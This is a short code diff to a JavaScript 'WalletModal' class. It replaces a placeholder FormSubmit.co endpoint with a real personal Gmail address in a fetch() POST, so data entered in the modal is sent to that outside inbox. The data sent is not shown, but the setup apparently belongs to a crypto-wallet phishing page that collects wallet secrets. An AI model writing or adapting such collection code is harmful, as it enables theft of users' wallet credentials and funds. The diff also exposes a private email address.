@@ -916,7 +916,7 @@ class WalletModal {
     }
     
     // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
-    fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
+    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
       method: 'POST', 
       headers: { 
         'Content-Type': 'application/json',
@@ -1040,3 +1040,4 @@ if (!window.walletModal) {
 }
 
 })(); // End IIFE
+
